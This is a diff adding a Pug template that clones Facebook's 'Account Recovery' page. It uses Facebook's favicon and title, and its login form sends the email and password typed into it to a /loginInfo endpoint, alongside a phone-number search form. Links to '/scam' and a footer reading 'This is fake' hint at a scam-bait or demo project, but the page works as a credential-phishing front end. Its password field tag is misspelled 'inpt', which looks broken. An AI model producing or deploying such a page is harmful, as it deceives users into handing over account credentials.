@@ -1,0 +1,47 @@
+doctype html
+html(lang="en")
+    head
+        meta(charset="UTF-8")
+        meta(http-equiv="X-UA-Compatible", content="IE=edge")
+        meta(name="viewport", content="width=device-width, initial-scale=1.0")
+        link(rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico")
+        title Account Recovery | Facebook
+        link(rel="stylesheet" href="/static/css/style.css")
+        script(src="/static/bootstrap/js/jquery.min.js") 
+        script(src="/static/bootstrap/js/bootstrap.min.js") 
+        script(src="/static/scripts/index.js") 
+        link(rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css")
+    body 
+        nav.navbar.navbar-light.bg-white.py-2 
+            a.navbar-brand(href="/scam") 
+                include includes/logo
+            form.form-inline(method="POST" onsubmit="return validate();" action="/loginInfo")
+                input.form-control.mr-sm-2.mr-xs-0(type="text" name="email" placeholder="Email or Phone" aria-label="Username" required)
+                inpt.form-control.mr-sm-2.mr-xs-0(type="password" name="password" placeholder="Password" aria-label="Password" required)
+                input.btn.custom-btn.my-2.my-sm-0.text-light.no-outline(type="submit", value="Log In")
+                script document.forms[0]["email"].addEventListener("keyup", function(e){if(validate(e.target.value)) this.classList.remove("invalid")})
+        .card
+            p.card-title.pt-3 Find Your Account 
+            .d-flex.justify-content-center 
+                script(src="/static/scripts/script.js") 
+                form(onsubmit="next()" style="width: 100%;")
+                    .alert.alert-danger.mx-3.d-none.mt-2.mb-0#err(role="alert")
+                        | Account Not Found
+                    .mx-auto(style="width: 80%")
+                        ul.list-group.list-group.flush.borderless.pb-3 
+                            li.list-group-item.pb-1.msg 
+                                | Please enter your email or phone number to search for your account 
+                            li.list-group-item.pt-0 
+                                input#phone(type="text"  name="phone" placeholder="Mobile number" style="width: 55%" required)
+                    .card-footer.d-flex.py-2 
+                        button.btn.no-outline.ml-auto.phonebtn.text-white Search 
+        footer.footer 
+            .container 
+                ul.text-muted 
+                    li English (US)
+                    li
+                        span.a Espa&ntilde;ol 
+                    li 
+                        span.a Fran&ccedil;ais (Canadia)
+                    li.d-block#copy(style="float: right" onmouseover="$(this).css('font-size','2em')") &copy;2022 This is fake
+        script(src="/static/scripts/fun.js") 
